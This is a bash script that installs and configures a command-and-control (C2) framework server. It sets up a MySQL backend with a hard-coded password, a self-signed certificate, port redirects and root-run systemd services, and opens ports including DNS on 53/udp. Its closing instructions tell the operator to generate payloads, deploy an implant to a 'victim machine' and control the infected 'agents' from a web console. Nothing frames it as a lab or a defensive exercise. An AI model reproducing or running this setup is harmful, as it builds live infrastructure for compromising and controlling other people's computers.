#!/bin/bash

echo "========================================="
echo "C2 Framework Setup Script"
echo "========================================="

# Check if running as root
if [ "$EUID" -ne 0 ]; then 
    echo "Please run as root (sudo ./setup.sh)"
    exit 1
fi

# Update system
echo "[*] Updating system..."
apt update && apt upgrade -y

# Install dependencies
echo "[*] Installing dependencies..."
apt install -y python3 python3-pip python3-venv mysql-server redis-server nginx
apt install -y golang-go nodejs npm docker.io
apt install -y wireshark tcpdump net-tools openssl
apt install -y git build-essential cython3

# Setup Python environment
echo "[*] Setting up Python environment..."
cd /opt
mkdir -p c2-framework
cd c2-framework
python3 -m venv venv
source venv/bin/activate

# Install Python packages
echo "[*] Installing Python packages..."
pip install --upgrade pip
pip install flask flask-socketio flask-sqlalchemy flask-login flask-cors
pip install cryptography pycryptodome requests paramiko
pip install gevent gunicorn redis pymysql
pip install scapy dnspython aiodns pyinstaller
pip install colorama tabulate termcolor
pip install pycryptodomex

# Setup MySQL
echo "[*] Configuring MySQL..."
mysql << EOF
CREATE DATABASE IF NOT EXISTS c2_framework;
CREATE USER IF NOT EXISTS 'c2user'@'localhost' IDENTIFIED BY 'C2StrongPass123!';
GRANT ALL PRIVILEGES ON c2_framework.* TO 'c2user'@'localhost';
FLUSH PRIVILEGES;
EOF

# Generate SSL certificates
echo "[*] Generating SSL certificates..."
mkdir -p ssl
openssl req -x509 -newkey rsa:4096 -nodes \
    -out ssl/cert.pem -keyout ssl/key.pem -days 365 \
    -subj "/C=US/ST=State/L=City/O=C2/CN=c2.local"

# Setup iptables rules for redirection
echo "[*] Configuring iptables..."
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 4443

# Create service files
echo "[*] Creating systemd services..."

# C2 Server service
cat > /etc/systemd/system/c2-server.service << EOF
[Unit]
Description=C2 Framework Server
After=network.target mysql.service

[Service]
Type=simple
User=root
WorkingDirectory=/opt/c2-framework
Environment="PATH=/opt/c2-framework/venv/bin"
ExecStart=/opt/c2-framework/venv/bin/python3 /opt/c2-framework/server/c2_server.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Web Console service
cat > /etc/systemd/system/c2-console.service << EOF
[Unit]
Description=C2 Web Console
After=network.target c2-server.service

[Service]
Type=simple
User=root
WorkingDirectory=/opt/c2-framework
Environment="PATH=/opt/c2-framework/venv/bin"
ExecStart=/opt/c2-framework/venv/bin/python3 /opt/c2-framework/web/console.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Enable services
systemctl daemon-reload
systemctl enable c2-server
systemctl enable c2-console
systemctl start c2-server
systemctl start c2-console

# Create directory structure
mkdir -p /var/log/c2
chmod 755 /var/log/c2

# Setup firewall
ufw allow 443/tcp
ufw allow 5000/tcp
ufw allow 53/udp

echo "========================================="
echo "[+] Setup Complete!"
echo "[+] C2 Server: https://$(hostname -I | awk '{print $1}'):443"
echo "[+] Web Console: http://$(hostname -I | awk '{print $1}'):5000"
echo "[+] Logs: /var/log/c2/"
echo "========================================="
echo "Next steps:"
echo "1. Generate payloads: cd /opt/c2-framework && python modules/payload_generator.py https://YOUR_SERVER_IP:443"
echo "2. Deploy implant to victim machine"
echo "3. Access web console to interact with agents"
echo "========================================="
